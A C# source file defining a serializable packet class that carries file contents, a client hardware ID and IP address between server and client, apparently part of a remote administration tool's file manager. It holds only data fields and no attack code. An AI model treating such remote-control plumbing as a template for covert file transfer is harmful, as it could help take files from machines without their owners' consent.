using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class DownloadFilePacket : IPacket
    {
        //server
        public DownloadFilePacket(string path, long fileTicket) : base()
        {
            this.PacketType = PacketType.FM_DOWNLOAD_FILE;
            this.fileName = path;
            this.fileTicket = fileTicket;
        }

        //client
        public DownloadFilePacket(byte[]file, string fileName, string baseIp, string HWID, long fileTicket) : base() 
        {
            this.PacketType = PacketType.FM_DOWNLOAD_FILE;
            this.BaseIp = baseIp;
            this.HWID = HWID;
            this.fileTicket = fileTicket;

            this.file = file;
            this.fileName = fileName;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }
        public long fileTicket { get; set; }

        public string fileName { get; set; }
        public byte[] file { get; set; }
        public int size { get; set; }
        public int bufferSize { get; set; }
    }
}
